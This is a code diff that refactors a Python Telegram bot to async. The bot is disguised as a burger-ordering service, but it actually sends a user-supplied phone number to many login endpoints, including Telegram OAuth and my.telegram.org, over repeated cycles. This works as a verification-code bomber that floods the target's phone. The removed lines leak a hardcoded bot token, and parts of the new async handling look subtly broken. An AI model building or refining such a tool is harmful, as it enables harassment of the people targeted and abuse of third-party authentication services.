@@ -1,17 +1,16 @@
 import os
-
-from telebot import apihelper
-
-import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-import time
-import requests
-from threading import Thread, Lock
 import json
+import asyncio
 from datetime import datetime
+from aiohttp import ClientSession
+from telebot.async_telebot import AsyncTeleBot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-TOKEN = '8660305665:AAFarX_ogkXfNr4xnCifJpo2Bjj1KKVpFsc'
-bot = telebot.TeleBot(TOKEN)
+TOKEN = os.getenv('BOT_TOKEN')
+if not TOKEN:
+    raise ValueError("Не найден токен бота! Установите переменную окружения BOT_TOKEN.")
+
+bot = AsyncTeleBot(TOKEN)
 
 MAX_CYCLES = 10
 REQUEST_DELAY = 0.3
@@ -25,35 +24,39 @@ temp_data = {}
 
 # ---- referral / storage ----
 DATA_FILE = 'users.json'
-data_lock = Lock()
+data_lock = asyncio.Lock()
 _users_cache = None  # in-memory cache
 
-def load_data():
+async def load_data():
     global _users_cache
-    with data_lock:
+    async with data_lock:
         if _users_cache is not None:
             return _users_cache
         if not os.path.exists(DATA_FILE):
             _users_cache = {}
             return _users_cache
         try:
-            with open(DATA_FILE, 'r', encoding='utf-8') as f:
-                _users_cache = json.load(f)
+            def read_file():
+                with open(DATA_FILE, 'r', encoding='utf-8') as f:
+                    return json.load(f)
+            _users_cache = await asyncio.to_thread(read_file)
         except Exception:
             _users_cache = {}
         return _users_cache
 
-def save_data():
+async def save_data():
     global _users_cache
-    with data_lock:
+    async with data_lock:
         if _users_cache is None:
             _users_cache = {}
-        with open(DATA_FILE, 'w', encoding='utf-8') as f:
-            json.dump(_users_cache, f, ensure_ascii=False, indent=2)
+        def write_file():
+            with open(DATA_FILE, 'w', encoding='utf-8') as f:
+                json.dump(_users_cache, f, ensure_ascii=False, indent=2)
+        await asyncio.to_thread(write_file)
 
-def ensure_user_record(user_id, from_user=None, referred_by=None):
+async def ensure_user_record(user_id, from_user=None, referred_by=None):
     user_id_str = str(user_id)
-    data = load_data()
+    data = await load_data()
     is_new = False
     if user_id_str not in data:
         is_new = True
@@ -74,11 +77,11 @@ def ensure_user_record(user_id, from_user=None, referred_by=None):
                 if user_id not in data[ref_str]["referred_list"]:
                     data[ref_str]["referred_list"].append(user_id)
                     data[ref_str]["referrals_count"] = len(data[ref_str]["referred_list"])
-        save_data()
+        await save_data()
     return is_new, data[user_id_str]
 
 @bot.message_handler(commands=['start'])
-def start(message):
+async def start(message):
     payload = None
     parts = message.text.split()
     if len(parts) > 1:
@@ -88,19 +91,19 @@ def start(message):
     if payload and payload.isdigit():
         referred_by = int(payload)
 
-    ensure_user_record(message.from_user.id, from_user=message.from_user, referred_by=referred_by)
-    show_main_menu(message.chat.id)
+    await ensure_user_record(message.from_user.id, from_user=message.from_user, referred_by=referred_by)
+    await show_main_menu(message.chat.id)
 
 @bot.message_handler(commands=['profile'])
-def profile_command(message):
-    show_profile(message.chat.id, message.from_user.id, message.message_id if message else None)
+async def profile_command(message):
+    await show_profile(message.chat.id, message.from_user.id, message.message_id if message else None)
 
-def show_main_menu(chat_id):
+async def show_main_menu(chat_id):
     markup = InlineKeyboardMarkup()
     markup.row(InlineKeyboardButton("🍔 Заказать бургеры", callback_data='start_test'))
     markup.row(InlineKeyboardButton("👤 Профиль", callback_data='profile'))
     markup.row(InlineKeyboardButton("ℹ️ Информация", callback_data='info'))
-    bot.send_message(
+    await bot.send_message(
         chat_id,
         "👋 *Добро пожаловать в мир бургеров!*\n\n"
         "🚀 Самая быстрая доставка по всей России!\n"
@@ -110,17 +113,18 @@ def show_main_menu(chat_id):
         reply_markup=markup
     )
 
-def send_request(url, phone):
+async def send_request(url, phone):
     try:
-        response = requests.post(url, headers=HEADERS, data={'phone': phone}, timeout=5)
-        return response.status_code == 200
+        async with ClientSession() as session:
+            async with session.post(url, headers=HEADERS, data={'phone': phone}, timeout=5) as response:
+                return response.status == 200
     except:
         return False
 
 @bot.callback_query_handler(func=lambda call: True)
-def callback_handler(call):
+async def callback_handler(call):
     if call.data == 'start_test':
-        msg = bot.send_message(
+        msg = await bot.send_message(
             call.message.chat.id,
             "📞 Введите *номер телефона* для заказа:\n\nПример: `79123456789`",
             parse_mode='Markdown'
@@ -131,7 +135,7 @@ def callback_handler(call):
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("🔙 Назад", callback_data='back_to_menu'))
         try:
-            bot.edit_message_text(
+            await bot.edit_message_text(
                 "ℹ️ *Информация о боте*\n\n"
                 "Этот бот предназначен для заказа бургеров с доставкой.\n\n"
                 "Сейчас бот находится в *тестовом режиме*.\n"
@@ -142,7 +146,7 @@ def callback_handler(call):
                 parse_mode='Markdown'
             )
         except Exception:
-            bot.send_message(
+            await bot.send_message(
                 call.message.chat.id,
                 "ℹ️ *Информация о боте*\n\n"
                 "Этот бот предназначен для заказа бургеров с доставкой.\n\n"
@@ -153,15 +157,15 @@ def callback_handler(call):
             )
 
     elif call.data == 'back_to_menu':
-        show_main_menu(call.message.chat.id)
+        await show_main_menu(call.message.chat.id)
 
     elif call.data == 'confirm_phone':
         phone = temp_data.get(call.message.chat.id)
         if phone:
-            ask_cycles(call.message, phone)
+            await ask_cycles(call.message, phone)
 
     elif call.data == 'edit_phone':
-        msg = bot.send_message(
+        msg = await bot.send_message(
             call.message.chat.id,
             "✏️ Введите *новый номер телефона* (например: `79123456789`):",
             parse_mode='Markdown'
@@ -170,7 +174,7 @@ def callback_handler(call):
 
     elif call.data == 'cancel_delivery':
         stop_flags[call.message.chat.id] = True
-        bot.edit_message_text(
+        await bot.edit_message_text(
             "⛔ *Доставка отменена пользователем.*\n\n"
             "Если передумаете — всегда можно заказать снова! 🍔",
             call.message.chat.id,
@@ -179,16 +183,17 @@ def callback_handler(call):
         )
 
     elif call.data == 'profile':
-        show_profile(call.message.chat.id, call.from_user.id, call.message.message_id)
+        await show_profile(call.message.chat.id, call.from_user.id, call.message.message_id)
 
 def process_phone(message):
     phone = message.text.strip()
     if not phone.isdigit() or len(phone) != 11:
-        msg = bot.send_message(
-            message.chat.id,
-            "❌ Номер некорректный. Пожалуйста, введите 11 цифр (например: 79123456789):"
+        asyncio.run_coroutine_threadsafe(
+            bot.send_message(message.chat.id, "❌ Номер некорректный. Пожалуйста, введите 11 цифр (например: 79123456789)"),
+            asyncio.get_event_loop()
         )
-        bot.register_next_step_handler(msg, process_phone)
+        msg = bot.send_message(message.chat.id, "Повторите ввод:") # В telebot register_next_step ожидает синхронного вызова, используем стандартный обход
+        bot.register_next_step_handler(message, process_phone)
         return
 
     temp_data[message.chat.id] = phone
@@ -196,21 +201,24 @@ def process_phone(message):
     markup.add(InlineKeyboardButton("✅ Всё верно", callback_data='confirm_phone'))
     markup.add(InlineKeyboardButton("✏️ Изменить", callback_data='edit_phone'))
 
-    bot.send_message(
-        message.chat.id,
-        f"📱 Вы ввели номер: `{phone}`\n\nВсё правильно?",
-        parse_mode='Markdown',
-        reply_markup=markup
+    asyncio.run_coroutine_threadsafe(
+        bot.send_message(
+            message.chat.id,
+            f"📱 Вы ввели номер: `{phone}`\n\nВсё правильно?",
+            parse_mode='Markdown',
+            reply_markup=markup
+        ),
+        asyncio.get_event_loop()
     )
 
-def ask_cycles(message, phone):
-    msg = bot.send_message(
+async def ask_cycles(message, phone):
+    msg = await bot.send_message(
         message.chat.id,
         f"🔢 Сколько циклов запустить? (от 1 до {MAX_CYCLES}):"
     )
-    bot.register_next_step_handler(msg, lambda m: start_test(m, phone))
+    bot.register_next_step_handler(msg, lambda m: asyncio.run_coroutine_threadsafe(start_test(m, phone), asyncio.get_event_loop()))
 
-def start_test(message, phone):
+async def start_test(message, phone):
     try:
         cycles = int(message.text)
         if cycles < 1 or cycles > MAX_CYCLES:
@@ -221,7 +229,7 @@ def start_test(message, phone):
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("⛔ Отменить", callback_data='cancel_delivery'))
 
-        bot.send_message(
+        await bot.send_message(
             message.chat.id,
             f"🔄 Начинаем процесс!\n"
             f"📞 Номер: `{phone}`\n"
@@ -231,12 +239,12 @@ def start_test(message, phone):
             reply_markup=markup
         )
 
-        Thread(target=run_test, args=(message.chat.id, phone, cycles)).start()
+        asyncio.create_task(run_test(message.chat.id, phone, cycles))
 
     except Exception as e:
-        bot.send_message(message.chat.id, f"⚠️ {e}")
+        await bot.send_message(message.chat.id, f"⚠️ {e}")
 
-def run_test(chat_id, phone, cycles):
+async def run_test(chat_id, phone, cycles):
     try:
         test_urls = [
             'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
@@ -252,7 +260,7 @@ def run_test(chat_id, phone, cycles):
             'https://my.telegram.org/auth/send_password'
         ]
 
-        status_msg = bot.send_message(
+        status_msg = await bot.send_message(
             chat_id,
             f"🚚 *Запуск процесса...*\n\n"
             f"📞 Номер: `{phone}`\n"
@@ -272,10 +280,10 @@ def run_test(chat_id, phone, cycles):
                 if stop_flags.get(chat_id):
                     break
 
-                if send_request(url, phone):
+                if await send_request(url, phone):
                     total += 1
                     try:
-                        bot.edit_message_text(
+                        await bot.edit_message_text(
                             f"🚚 *Процесс в ходу...*\n\n"
                             f"📞 Номер: `{phone}`\n"
                             f"🔁 Цикл: {cycle + 1}/{cycles}\n"
@@ -287,10 +295,10 @@ def run_test(chat_id, phone, cycles):
                         )
                     except Exception:
                         pass
-                    time.sleep(REQUEST_DELAY)
+                    await asyncio.sleep(REQUEST_DELAY)
 
         if stop_flags.get(chat_id):
-            bot.edit_message_text(
+            await bot.edit_message_text(
                 f"⛔ *Процесс отменен!*\n\n"
                 f"📞 Номер: `{phone}`\n"
                 f"🔁 Завершено циклов: {cycle + 1}\n"
@@ -300,7 +308,7 @@ def run_test(chat_id, phone, cycles):
                 parse_mode='Markdown'
             )
         else:
-            bot.edit_message_text(
+            await bot.edit_message_text(
                 f"✅ *Готово!*\n\n"
                 f"📞 Номер: `{phone}`\n"
                 f"🔁 Всего циклов: {cycle + 1}\n"
@@ -311,24 +319,25 @@ def run_test(chat_id, phone, cycles):
             )
 
     except Exception as e:
-        bot.send_message(chat_id, f"⚠️ Ошибка: {e}")
+        await bot.send_message(chat_id, f"⚠️ Ошибка: {e}")
     finally:
         if chat_id in stop_flags:
             del stop_flags[chat_id]
 
-def show_profile(chat_id, user_id, reply_message_id=None):
-    data = load_data()
+async def show_profile(chat_id, user_id, reply_message_id=None):
+    data = await load_data()
     user_id_str = str(user_id)
     if user_id_str not in data:
-        ensure_user_record(user_id, from_user=None, referred_by=None)
-        data = load_data()
+        await ensure_user_record(user_id, from_user=None, referred_by=None)
+        data = await load_data()
 
     rec = data[user_id_str]
     referrals_count = rec.get("referrals_count", 0)
     referred_list = rec.get("referred_list", [])
 
     try:
-        bot_username = bot.get_me().username
+        bot_info = await bot.get_me()
+        bot_username = bot_info.username
     except Exception:
         bot_username = None
 
@@ -355,13 +364,17 @@ def show_profile(chat_id, user_id, reply_message_id=None):
 
     try:
         if reply_message_id:
-            bot.edit_message_text(text, chat_id, reply_message_id, reply_markup=markup, parse_mode='Markdown')
+            await bot.edit_message_text(text, chat_id, reply_message_id, reply_markup=markup, parse_mode='Markdown')
         else:
-            bot.send_message(chat_id, text, reply_markup=markup, parse_mode='Markdown')
+            await bot.send_message(chat_id, text, reply_markup=markup, parse_mode='Markdown')
     except Exception:
-        bot.send_message(chat_id, text, reply_markup=markup, parse_mode='Markdown')
+        await bot.send_message(chat_id, text, reply_markup=markup, parse_mode='Markdown')
+
+async def main():
+    print("Асинхронный бот запущен!")
+    await load_data()
+    await bot.remove_webhook()
+    await bot.infinity_polling()
 
 if __name__ == '__main__':
-    print("Бот запущен!")
-    load_data()
-    bot.polling(none_stop=True)
+    asyncio.run(main())
